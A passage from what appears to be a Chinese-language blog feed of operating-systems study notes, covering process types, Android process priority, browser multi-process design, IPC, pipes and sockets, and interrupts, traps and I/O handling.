&lt;li&gt;仍在运行：进程仍然正常执行&lt;/li&gt;
&lt;li&gt;父进程变更：PPID变为1（init进程）&lt;/li&gt;
&lt;li&gt;正常运行：功能不受影响&lt;/li&gt;
&lt;li&gt;自动回收：退出时由init进程回收&lt;/li&gt;
&lt;li&gt;通常无害：不会造成资源泄漏&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;关键区别&#34;&gt;关键区别
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;僵尸进程是管理问题，有害，大量积累会耗尽系统资源，需要程序员解决&lt;/li&gt;
&lt;li&gt;孤儿进程是自然现象，无害，系统自动解决&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;android进程&#34;&gt;Android进程
&lt;/h3&gt;&lt;h4 id=&#34;android进程重要性层次结构&#34;&gt;Android进程重要性层次结构
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;移动操作系统经常需要终止进程来回收系统资源（如内存）。按重要性从高到低排列
&lt;ul&gt;
&lt;li&gt;前台进程：在屏幕上可见
&lt;ul&gt;
&lt;li&gt;用户正在使用微信&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;可见进程：不直接可见，但执行前台进程正在引用的活动
&lt;ul&gt;
&lt;li&gt;视频应用播放时弹出权限对话框&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;服务进程：如流媒体音乐
&lt;ul&gt;
&lt;li&gt;音乐应用后台播放&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;后台进程：执行活动，但用户不明显感知
&lt;ul&gt;
&lt;li&gt;用户切换应用后原应用进入后台&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;空进程：不包含任何活动&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Android将开始终止最不重要的进程&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;浏览器的多进程架构&#34;&gt;浏览器的多进程架构
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;在过去许多网页浏览器作为单一进程运行（有些仍然如此）。这会导致如果一个网站出现问题，整个浏览器都可能挂起或崩溃&lt;/li&gt;
&lt;li&gt;Google Chrome浏览器采用多进程架构，包含3中不同类型的进程：
&lt;ul&gt;
&lt;li&gt;浏览器进程：管理用户界面、磁盘和网络I/O&lt;/li&gt;
&lt;li&gt;渲染进程：渲染网页，处理HTML、Javascript。为每个打开的网页创建新的渲染进程&lt;/li&gt;
&lt;li&gt;运行在沙箱中，限制磁盘和网络I/O,最小化安全漏洞的影响&lt;/li&gt;
&lt;li&gt;插件进程：为每种类型的插件创建进程&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;进程间通信&#34;&gt;进程间通信
&lt;/h3&gt;&lt;h4 id=&#34;概念-1&#34;&gt;概念
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;系统中的进程可能是独立的或协作的
&lt;ul&gt;
&lt;li&gt;独立进程：无法影响或被其他进程的执行所影响的进程&lt;/li&gt;
&lt;li&gt;协作进程：可以影响或被其他进程影响的进程，包括共享数据&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;协作进程的原因：信息共享、计算加速、模块化、便利性、安全性&lt;/li&gt;
&lt;li&gt;写作进程需要进程间通信(IPC)&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;ipc模型&#34;&gt;IPC模型
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;存在两种IPC模型：
&lt;ul&gt;
&lt;li&gt;共享内存&lt;/li&gt;
&lt;li&gt;消息传递&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;示意图：
  &lt;p align=&#34;center&#34;&gt;
      &lt;img src=&#34;https://example.com/images/process2.png&#34; alt=&#34;IPC&#34; width=&#34;70%&#34;&gt;
  &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;生产者-消费者问题&#34;&gt;生产者-消费者问题
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;协作进程的范例，生产者进程产生信息，被消费者进程消费&lt;/li&gt;
&lt;li&gt;无界缓冲区：对缓冲区大小没有实际限制&lt;/li&gt;
&lt;li&gt;有界缓冲区：假设有固定的缓冲区大小&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;消息传递&#34;&gt;消息传递
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;进程通过交换消息互相通信&lt;/li&gt;
&lt;li&gt;无需依赖共享变量&lt;/li&gt;
&lt;li&gt;消息传递提供两个操作
&lt;ul&gt;
&lt;li&gt;send：发送消息&lt;/li&gt;
&lt;li&gt;receive：接受消息&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;如果P和Q希望通信，它们需要
&lt;ul&gt;
&lt;li&gt;在它们之间建立通信链路&lt;/li&gt;
&lt;li&gt;例如：邮箱(间接)或基于pid(直接)&lt;/li&gt;
&lt;li&gt;通过send/receive交换消息&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;直接与间接通信
&lt;ul&gt;
&lt;li&gt;直接通信
&lt;ul&gt;
&lt;li&gt;对称寻址: send(P, Message), receive(Q, Message)&lt;/li&gt;
&lt;li&gt;非对称寻址: send(P, message), receive(id, Message)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;间接通信
&lt;ul&gt;
&lt;li&gt;send(A, Message), receive(A, Message) -邮箱A&lt;/li&gt;
&lt;li&gt;邮箱可以由进程和操作系统实现&lt;/li&gt;
&lt;li&gt;邮箱所有者：谁可以接收消息&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;同步机制
&lt;ul&gt;
&lt;li&gt;消息传递可以是阻塞的或非阻塞的&lt;/li&gt;
&lt;li&gt;阻塞被认为是同步的
&lt;ul&gt;
&lt;li&gt;阻塞发送：发送者阻塞直到消息被接收&lt;/li&gt;
&lt;li&gt;阻塞接收：接收者阻塞直到有消息可用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;非阻塞被认为是异步的
&lt;ul&gt;
&lt;li&gt;非阻塞发送：发送者发送消息后继续执行&lt;/li&gt;
&lt;li&gt;非阻塞接收：接收者接收有效消息或返回空值&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;缓冲机制
&lt;ul&gt;
&lt;li&gt;附加到链路的消息队列&lt;/li&gt;
&lt;li&gt;零容量：0条消息
&lt;ul&gt;
&lt;li&gt;发送者必须等待接收者&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;有些容量：有线长度的n条消息
&lt;ul&gt;
&lt;li&gt;如果链路满，发送者必须等待&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;误解容量：无限长度
&lt;ul&gt;
&lt;li&gt;发送者永不等待&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;posix共享内存&#34;&gt;POSIX共享内存
&lt;/h3&gt;&lt;h4 id=&#34;概念-2&#34;&gt;概念
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;进程首先创建共享内存段&lt;/li&gt;
&lt;li&gt;也用于打开现有的内存段&lt;/li&gt;
&lt;li&gt;设置对象的大小&lt;/li&gt;
&lt;li&gt;使用mmap()将文件指针内存映射到共享内存对象&lt;/li&gt;
&lt;li&gt;对共享内存的督学通过mmap()返回的指针完成&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;管道&#34;&gt;管道
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;管道作为一个通道，允许两个本地进程通信&lt;/li&gt;
&lt;li&gt;关键问题
&lt;ul&gt;
&lt;li&gt;通信是单向的还是双向的？&lt;/li&gt;
&lt;li&gt;在双向通信的情况下，是半双工还是全双工？&lt;/li&gt;
&lt;li&gt;进程之间是否必须存在关系（即父子关系）？&lt;/li&gt;
&lt;li&gt;管道是否可以在网络上使用？&lt;/li&gt;
&lt;li&gt;通常只用于本地进程&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;普通管道
&lt;ul&gt;
&lt;li&gt;普通管道允许生产者-消费者风格的通信&lt;/li&gt;
&lt;li&gt;生产者写入一端&lt;/li&gt;
&lt;li&gt;消费者从另一端读取&lt;/li&gt;
&lt;li&gt;因此普通管道是单向的&lt;/li&gt;
&lt;li&gt;如果需要双向通信，需要两个管道&lt;/li&gt;
&lt;li&gt;要求通信进程之间有父子关系&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;命名管道
&lt;ul&gt;
&lt;li&gt;命名管道比普通管道更强大&lt;/li&gt;
&lt;li&gt;通信是双向的&lt;/li&gt;
&lt;li&gt;进程之间不需要父子关系&lt;/li&gt;
&lt;li&gt;多个进程可以使用命名管道进行通信&lt;/li&gt;
&lt;li&gt;命名管道在UNIX和Windows系统上都有提供&lt;/li&gt;
&lt;li&gt;在Linux上，它被称为FIFO&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;客户端-用户交互&#34;&gt;客户端-用户交互
&lt;/h3&gt;&lt;h4 id=&#34;套接字socket&#34;&gt;套接字(Socket)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;套接字被定义为通信的端点&lt;/li&gt;
&lt;li&gt;IP地址和端口的连接&lt;/li&gt;
&lt;li&gt;套接字 161.25.19.8:1625 指的是主机 161.25.19.8 上的端口 1625&lt;/li&gt;
&lt;li&gt;通信在一对套接字之间进行&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>操作系统</title>
        <link>https://example.com/p/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</link>
        <pubDate>Wed, 30 Jul 2025 21:40:00 +0800</pubDate>
        
        <guid>https://example.com/p/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</guid>
        <description>&lt;h1 id=&#34;操作系统&#34;&gt;操作系统
&lt;/h1&gt;&lt;h2 id=&#34;基本信息介绍&#34;&gt;基本信息介绍
&lt;/h2&gt;&lt;h3 id=&#34;操作系统信息&#34;&gt;操作系统信息
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;在经典的五级结构划分中，计算机组成结构包含&lt;strong&gt;数字逻辑层&lt;/strong&gt;、&lt;strong&gt;微体系结构层&lt;/strong&gt;、&lt;strong&gt;指令集架构层&lt;/strong&gt;、&lt;strong&gt;操作系统层&lt;/strong&gt;、&lt;strong&gt;应用程序层&lt;/strong&gt;。其中前三层属于&amp;quot;硬件层&amp;quot;，最后一层属于&amp;quot;软件层&amp;quot;。操作系统的地位就是硬件和软件之间的媒介。扮演资源分配器和控制程序的角色。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;计算机系统的四个组成部分&#34;&gt;计算机系统的四个组成部分
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;硬件(Hardware)&lt;/strong&gt;：提供基本的计算资源
&lt;ul&gt;
&lt;li&gt;CPU、内存、I/O设备等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;操作系统(Operating System)&lt;/strong&gt;：控制和协调硬件在用户之间的使用
&lt;ul&gt;
&lt;li&gt;资源分配器：管理所有资源，决定冲突请求的处理以实现高效和公平的资源共享&lt;/li&gt;
&lt;li&gt;控制程序：控制程序执行以防止错误和系统的不当使用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;应用程序(Application Programs)&lt;/strong&gt;：使用系统资源解决计算问题
&lt;ul&gt;
&lt;li&gt;如文字处理器、编译器、Web浏览器等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;用户(Users)&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;人、机器、其他计算机等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;操作系统定义与视角&#34;&gt;操作系统定义与视角
&lt;/h3&gt;&lt;h4 id=&#34;用户视角-vs-系统视角&#34;&gt;用户视角 vs 系统视角
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;用户视角&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;用户需要便利性和易用性&lt;/li&gt;
&lt;li&gt;不太关心资源利用率&lt;/li&gt;
&lt;li&gt;共享计算机（如主机）必须让所有用户满意&lt;/li&gt;
&lt;li&gt;手持设备资源受限，优化可用性和电池寿命&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;系统视角&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;操作系统是资源分配器&lt;/li&gt;
&lt;li&gt;操作系统是控制程序&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;操作系统定义&#34;&gt;操作系统定义
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;近似定义&lt;/strong&gt;：&amp;ldquo;当你订购操作系统时，供应商提供的所有东西&amp;rdquo;
&lt;ul&gt;
&lt;li&gt;没有普遍接受的定义&lt;/li&gt;
&lt;li&gt;供应商提供的内容可能差异很大&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;内核(Kernel)&lt;/strong&gt;：&amp;ldquo;始终在计算机上运行的一个程序&amp;rdquo;
&lt;ul&gt;
&lt;li&gt;其他都是系统程序或应用程序&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;操作系统在不同上下文中可能有不同含义&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;计算机系统组成&#34;&gt;计算机系统组成
&lt;/h2&gt;&lt;h3 id=&#34;硬件组件&#34;&gt;硬件组件
&lt;/h3&gt;&lt;h4 id=&#34;基本结构&#34;&gt;基本结构
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;CPU和设备控制器&lt;/strong&gt;通过总线连接共享内存&lt;/li&gt;
&lt;li&gt;CPU和设备&lt;strong&gt;并发执行&lt;/strong&gt;，竞争内存周期&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;设备控制器&#34;&gt;设备控制器
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;每个设备控制器负责特定类型的设备
&lt;ul&gt;
&lt;li&gt;磁盘控制器、USB控制器等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;每个设备控制器都有&lt;strong&gt;本地缓冲区&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;I/O过程&lt;/strong&gt;：在设备和控制器本地缓冲区之间进行&lt;/li&gt;
&lt;li&gt;CPU在主内存和控制器缓冲区之间移动数据&lt;/li&gt;
&lt;li&gt;I/O设备和CPU可以&lt;strong&gt;并发执行&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;直接内存访问dma&#34;&gt;直接内存访问(DMA)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;用途&lt;/strong&gt;：用于能够以接近内存速度传输信息的高速I/O设备
&lt;ul&gt;
&lt;li&gt;如以太网、硬盘、CD-ROM等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;工作流程&lt;/strong&gt;：
&lt;ol&gt;
&lt;li&gt;设备驱动程序向控制器发送I/O描述符&lt;/li&gt;
&lt;li&gt;I/O描述符包含：操作类型、内存地址等&lt;/li&gt;
&lt;li&gt;控制器在其本地缓冲区和主内存之间传输数据块，无需CPU干预&lt;/li&gt;
&lt;li&gt;整个I/O请求完成时只产生一个中断&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;中断与陷阱&#34;&gt;中断与陷阱
&lt;/h3&gt;&lt;h4 id=&#34;中断与陷阱讲解&#34;&gt;中断与陷阱讲解
&lt;/h4&gt;&lt;h5 id=&#34;中断interrupt&#34;&gt;中断（Interrupt）
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;定义&lt;/strong&gt;：中断是由外部硬件设备产生的异步事件，用来通知CPU某个事件已经发生&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;特点&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;异步发生：不可预知的时间点&lt;/li&gt;
&lt;li&gt;由外部硬件触发（如键盘输入、鼠标点击、网络数据到达等）&lt;/li&gt;
&lt;li&gt;CPU可以选择性地响应或屏蔽某些中断&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;类型&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;硬件中断&lt;/strong&gt;：由硬件设备产生（如定时器中断、I/O完成中断）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;软件中断&lt;/strong&gt;：由软件指令产生（如系统调用）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;处理流程&lt;/strong&gt;：
&lt;ol&gt;
&lt;li&gt;硬件检测到中断信号&lt;/li&gt;
&lt;li&gt;CPU完成当前指令执行&lt;/li&gt;
&lt;li&gt;保存当前程序状态（寄存器、程序计数器等）&lt;/li&gt;
&lt;li&gt;跳转到中断服务程序（ISR）&lt;/li&gt;
&lt;li&gt;执行中断处理&lt;/li&gt;
&lt;li&gt;恢复被中断程序的状态&lt;/li&gt;
&lt;li&gt;继续执行被中断的程序&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;陷阱trap&#34;&gt;陷阱（Trap）
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;定义&lt;/strong&gt;：陷阱是由正在执行的程序内部产生的同步事件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;特点&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;同步发生：在特定指令执行时产生&lt;/li&gt;
&lt;li&gt;由当前执行的程序触发&lt;/li&gt;
&lt;li&gt;通常用于系统调用和异常处理&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;类型&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;系统调用陷阱&lt;/strong&gt;：用户程序请求操作系统服务&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;异常陷阱&lt;/strong&gt;：程序执行错误（如除零错误、非法内存访问等）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;调试陷阱&lt;/strong&gt;：用于程序调试（如断点）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;处理流程&lt;/strong&gt;：
&lt;ol&gt;
&lt;li&gt;程序执行特定指令（如系统调用指令）&lt;/li&gt;
&lt;li&gt;CPU立即响应陷阱&lt;/li&gt;
&lt;li&gt;切换到内核模式&lt;/li&gt;
&lt;li&gt;跳转到相应的陷阱处理程序&lt;/li&gt;
&lt;li&gt;执行系统服务或异常处理&lt;/li&gt;
&lt;li&gt;返回用户模式（如果适用）&lt;/li&gt;
&lt;li&gt;继续执行程序&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;中断与陷阱的区别&#34;&gt;中断与陷阱的区别
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;触发源&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;中断：外部硬件设备&lt;/li&gt;
&lt;li&gt;陷阱：程序内部指令&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;时机&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;中断：异步，不可预测&lt;/li&gt;
&lt;li&gt;陷阱：同步，可预测&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;用途&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;中断：处理外部事件，提高系统响应性&lt;/li&gt;
&lt;li&gt;陷阱：实现系统调用，处理程序异常&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;可屏蔽性&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;中断：部分可屏蔽&lt;/li&gt;
&lt;li&gt;陷阱：通常不可屏蔽&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;重要性&#34;&gt;重要性
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;提高系统效率&lt;/strong&gt;：避免CPU空等，实现并发处理&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;实现系统调用&lt;/strong&gt;：用户程序与内核通信的桥梁&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;错误处理&lt;/strong&gt;：及时处理程序运行时错误&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;实时响应&lt;/strong&gt;：确保系统能够及时响应外部事件&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;操作系统对中断的处理&#34;&gt;操作系统对中断的处理
&lt;/h4&gt;&lt;h5 id=&#34;中断处理机制&#34;&gt;中断处理机制
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;中断向量表(Interrupt Vector Table)&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;存储中断服务程序入口地址的表格&lt;/li&gt;
&lt;li&gt;每个中断类型对应一个终端号和处理程序地址&lt;/li&gt;
&lt;li&gt;通常位于内存的固定位置&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;中断优先级&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;可屏蔽中断(Maskable Interrupt)&lt;/strong&gt;：可以被CPU忽略或延迟处理&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;不可屏蔽中断(Non-Maskable Interrupt, NMI)&lt;/strong&gt;：必须立即处理的紧急中断&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;优先级排序&lt;/strong&gt;：高优先级中断可以打断低优先级中断的处理&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;中断处理步骤&#34;&gt;中断处理步骤
&lt;/h5&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;中断识别&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;硬件产生中断信号&lt;/li&gt;
&lt;li&gt;CUPU在每个指令周期结束时检查中断请求&lt;/li&gt;
&lt;li&gt;确定中断源和中断类型】&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;现场保护&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;自动保存：CPU自动保存程序状态字&lt;/li&gt;
&lt;li&gt;手动保存：中断服务程序保存其他寄存器内容&lt;/li&gt;
&lt;li&gt;保存到内核栈或进程控制块&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;中断分发&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;根据中断号查找中断向量表&lt;/li&gt;
&lt;li&gt;跳转到对应的中断服务程序(ISR)&lt;/li&gt;
&lt;li&gt;切换到内核模式（如果尚未切换）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;中断处理&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;执行具体的中断服务代码&lt;/li&gt;
&lt;li&gt;处理硬件设备的请求&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;现场恢复&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;恢复之前保存的寄存器内容&lt;/li&gt;
&lt;li&gt;恢复程序状态字和程序计数器&lt;/li&gt;
&lt;li&gt;返回被中断的程序继续执行&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h6 id=&#34;中断处理策略&#34;&gt;中断处理策略
&lt;/h6&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;立即处理（Immediate Processing）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;中断发生时立即处理&lt;/li&gt;
&lt;li&gt;适用于紧急和高优先级中断&lt;/li&gt;
&lt;li&gt;可能影响系统响应时间&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;延迟处理（Deferred Processing）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将中断处理分为上半部和下半部&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;上半部&lt;/strong&gt;：快速处理紧急部分，清除中断源&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;下半部&lt;/strong&gt;：延后处理耗时的非紧急部分&lt;/li&gt;
&lt;li&gt;Linux中的软中断（softirq）和工作队列（workqueue）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;中断合并（Interrupt Coalescing）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将多个相同类型的中断合并处理&lt;/li&gt;
&lt;li&gt;减少中断处理开销&lt;/li&gt;
&lt;li&gt;提高系统吞吐量&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h6 id=&#34;中断控制器&#34;&gt;中断控制器
&lt;/h6&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;可编程中断控制器（PIC）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;管理多个中断源&lt;/li&gt;
&lt;li&gt;设置中断优先级&lt;/li&gt;
&lt;li&gt;屏蔽特定中断&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;高级可编程中断控制器（APIC）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;支持多处理器系统&lt;/li&gt;
&lt;li&gt;提供更灵活的中断路由&lt;/li&gt;
&lt;li&gt;支持中断重定向和负载均衡&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h6 id=&#34;现代操作系统的优化&#34;&gt;现代操作系统的优化
&lt;/h6&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;中断线程化&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将中断处理程序作为内核线程运行&lt;/li&gt;
&lt;li&gt;提高系统的实时性和可预测性&lt;/li&gt;
&lt;li&gt;便于调试和性能分析&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;中断亲和性（Interrupt Affinity）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将特定中断绑定到特定CPU核心&lt;/li&gt;
&lt;li&gt;提高缓存利用率和性能&lt;/li&gt;
&lt;li&gt;减少处理器间通信开销&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;动态中断分配&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;根据系统负载动态调整中断处理&lt;/li&gt;
&lt;li&gt;实现负载均衡&lt;/li&gt;
&lt;li&gt;适应不同的工作负载模式&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;io&#34;&gt;I/O
&lt;/h3&gt;&lt;h4 id=&#34;io基本介绍&#34;&gt;I/O基本介绍
&lt;/h4&gt;&lt;h5 id=&#34;从系统调用到设备的io过程&#34;&gt;从系统调用到设备的I/O过程
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;系统调用访问&lt;/strong&gt;：程序使用系统调用访问系统资源
&lt;ul&gt;
&lt;li&gt;如文件、网络等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;设备访问转换&lt;/strong&gt;：操作系统将其转换为设备访问并发出I/O请求&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;I/O请求传输&lt;/strong&gt;：I/O请求发送到设备驱动程序，然后到控制器
&lt;ul&gt;
&lt;li&gt;如读取磁盘块、发送/接收数据包等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;等待处理&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;同步I/O&lt;/strong&gt;：OS让程序等待&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;异步I/O&lt;/strong&gt;：OS不等待直接返回给程序&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
